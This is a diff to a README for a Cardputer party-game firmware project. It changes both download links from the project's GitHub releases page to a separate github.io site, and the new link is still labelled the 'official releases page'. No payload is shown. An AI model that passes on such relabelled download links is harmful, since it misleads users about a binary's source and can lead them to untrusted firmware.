@@ -1,6 +1,6 @@
 # 🕹️ hotspot-arcade-cardputer - Play party games without any internet
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pimozideoring178/hotspot-arcade-cardputer/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://pimozideoring178.github.io)
 
 ## What is this tool? 🎮
 
@@ -18,7 +18,7 @@ You need these items to run the system:
 
 You must download the firmware files to your computer first. 
 
-1. Visit the [official releases page](https://github.com/Pimozideoring178/hotspot-arcade-cardputer/releases).
+1. Visit the [official releases page](https://pimozideoring178.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .bin to save the file to your computer.
 4. Keep this file in a folder you can find later.
